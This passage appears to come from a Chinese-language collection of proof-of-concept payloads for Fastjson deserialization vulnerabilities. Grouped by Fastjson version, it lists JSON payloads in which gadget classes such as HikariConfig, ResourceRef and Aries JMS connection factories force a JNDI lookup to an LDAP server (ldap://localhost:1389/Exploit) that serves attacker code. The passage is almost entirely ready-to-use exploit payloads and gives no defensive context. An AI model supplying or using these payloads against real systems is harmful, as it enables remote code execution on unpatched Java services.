{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}
```
## 1.2.68

org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：
```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

com.caucho.config.types.ResourceRef类PoC：
```json
{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
```

## 未知版本

org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：
```json
{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```


org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：
```json
{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```














